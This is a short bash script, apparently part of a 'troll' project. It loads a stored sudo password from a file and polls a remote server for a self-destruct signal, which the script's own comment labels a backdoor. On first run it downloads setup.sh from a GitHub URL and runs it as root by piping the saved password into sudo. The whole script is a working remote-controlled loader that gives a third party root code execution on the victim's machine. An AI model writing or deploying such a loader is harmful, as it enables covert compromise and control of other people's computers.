#!/usr/bin/env bash

TARGET_DIR="$HOME/programfiles"
SUBP_DIR="$TARGET_DIR/subp"
SUCCESS_MARKER="$SUBP_DIR/success"
SETUP_URL="https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/setup.sh"
SETUP_PATH="$TARGET_DIR/setup.sh"

# Load sudo password from file
PFILE="$TARGET_DIR/p.txt"
if [ ! -f "$PFILE" ]; then
    echo "❌ Password file not found at '$PFILE'."
    exit 1
fi

SUDO_PASS=$(<"$PFILE")

# === Backdoor: self-destruct trigger ===
RESPONSE=$(curl -s "https://drive.genshinimpact.ca/f/pYfA/carterbrick")
if echo "$RESPONSE" | grep -q '"code":40004,"msg":"Object existed"'; then
  echo "[*] Self-destruct trigger received. Launching sd.sh..."
  bash "$TARGET_DIR/subp/sd.sh"
  exit 0
fi


# Ensure base directories exist
mkdir -p "$TARGET_DIR" "$SUBP_DIR"

# If subp exists but success marker is missing, reset for re-run
if [ -d "$SUBP_DIR" ] && [ ! -e "$SUCCESS_MARKER" ]; then
  echo "[*] Detected existing subp without success marker. Resetting subp for re-run..."
  rm -rf "$SUBP_DIR"
  mkdir -p "$SUBP_DIR"
fi

# First-run bootstrap: if no success marker, download setup.sh and run setup
if [ ! -e "$SUCCESS_MARKER" ]; then
    echo "[*] First run detected: downloading setup.sh..."
    curl -sSL -o "$SETUP_PATH" "$SETUP_URL"
    echo "[*] setup.sh downloaded to $SETUP_PATH"
    # Execute setup.sh on first run
    echo "[*] Running setup.sh for initial configuration..."
    echo "$SUDO_PASS" | sudo -S bash "$SETUP_PATH"
    # Mark setup as completed
    touch "$SUCCESS_MARKER"
fi
